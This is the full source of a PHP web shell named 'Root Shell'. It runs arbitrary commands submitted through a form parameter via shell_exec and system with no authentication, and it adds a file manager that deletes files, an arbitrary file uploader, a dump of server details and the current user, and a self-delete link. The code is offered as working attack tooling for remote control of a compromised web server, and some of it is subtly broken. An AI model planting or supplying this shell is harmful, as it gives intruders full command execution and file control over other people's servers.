<?php
if (!empty($_POST['cmd'])) {
    $cmd = shell_exec($_POST['cmd']);
}
?>
<!DOCTYPE>
<html>
  <head>
    <title> Root Shell </title>
<link rel="shortcut icon" type="image/jpg" href="https://i.ibb.co/FVm9QT4/logo.png"/>
</head>
<center>
  <img src="https://i.ibb.co/FVm9QT4/logo.png" height="550px" alt="logo">
<br>
</center>
<center>
<a id = "btns" href = "?fi=file">File Manager</a>
<a id = "btns" href = "?upl=up">Uploader</a>
<a id = "btns" href = "?in=info">Information</a>
<a id = "btns" href = "?die=del">Delete Me</a>
</center>
<form method="post">
  <input type="text" name="cmd" id="exec" value="<?= $_POST['cmd']?>"
   <input type="submit" value="Execute">
</form>
</button>
</center>
</form>
</html>
<style>
#btns{
  background-color: #6aa5d9;
  padding: 16px;
}
a {
    text-decoration:none;
    color: black;
    padding: 8px 16px;
    font-family: sans-serif;
    border-radius: 3px;
    font-weight:bold;
  }
  .url{
  text-decoration: none;
  background-color: #000000;
  color: white;
  display: block;
  padding: 15px 30px;
  display: block;
  cursor: pointer;
  margin-left: 370px;
  border-radius: 10px;
  transition: 0.25s;
  }
  
  a:hover {
    background-color: #029e74;
  }
#_upl{
  text-decoration: none;
  color: white;
  font-size: 13px;
  text-transform: uppercase;
  display: block;
  border:0;
  background: black;
  margin: 20px auto;
  text-align: center;
  border: 2px solid white; 
  padding: 14px 40px;
  outline: none;
  color: white;
  border-radius: 24px;
  transition: 0.25s;
  cursor: pointer;
}
#fname{
  text-decoration: none;
  color: white;
  font-size: 13px;
  display: block;
}
     #exec{
      height: 30;
      width: 80;
      border: white;
    }
    input{
      font-family: monospace;
      height: 60px;
      width: 230px;
      margin: auto;
      border: none;
      align-self: center;
    }
    p{
      font-size: 14px;
      font-family: monospace;
    }
    #area{
      border-radius: 10px;
      padding: 30p;
      background-color: #6aa5d9;
    }
        main {
            margin: auto;
            max-width: 800px;
        }

        pre{
            border-radius: 10px;
        }

        pre{
            background-color: #e1eef0;
        }
        label {
            display: block;
        }
        pre{
            padding: 20px;
        }
</style>
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre><b><p>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo '</pre></p>';
        die;
}
?>
<?php
if (isset($_GET['fi'])){
  echo "<br>";
  if (isset($_GET['id'])) {
  unlink($_GET['id']);
}
$dir = "./";
$a = scandir($dir);
$str = '<table><tr><th></th><th></th></tr>';
foreach ($a as $val){
  if($val=="." || $val==".." || $val=="..."){
    continue;
  }
  $str .= "<tr><td><p id = 'fname'>$val</p><td><a class = 'url' href= ?del=$val>Delate</a></td></tr>";
}
$str .= "</table>";
echo '<pre id = "area"><p>'.$str.'</p></pre>';
die();
}
?>
<?php
if (isset($_GET['upl'])){
  echo '<form method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<center><input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="UP"></center></form>';
if( $_POST['_upl'] == "UP" ) {
  if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { 
  echo '<p><center>'.$_FILES['file']['name'].' Uploaded Successfully</center><br><center><a href="/'.$_FILES['file']['name'].'">Click me</a>';}
  else { 
     echo '<center><p>'.$_FILES['file']['name'].' Not Uploaded Successfully</center>'; 
}
}
}
?>
<?php
if (isset($_GET['in'])){
  echo "[ x ] Operating System ".PHP_OS."<br>";
  echo "[ x ] PHP Version ".PHP_VERSION."<br>";
  echo "[ x ] IP Address ".$_SERVER['REMOTE_ADDR'];
  echo '<br>';
  echo "[ x ] Headers ".php_uname();
  echo "<br>";
  echo "[ x ] Browser ".$_SERVER['HTTP_USER_AGENT'];
  echo "<br>";
  echo "[ x ] Server Software ". $_SERVER['SERVER_SOFTWARE'];
  echo "<br>";
  echo "[ x ] Privilege ".@get_current_user();
  echo "<br>";
}
?>
<?php
if (isset($_GET['die'])){
  if(@unlink(preg_replace(__FILE__))) { echo "<center><h1>Logged Out...</h1></center>";}?>
  <?php
}
?>
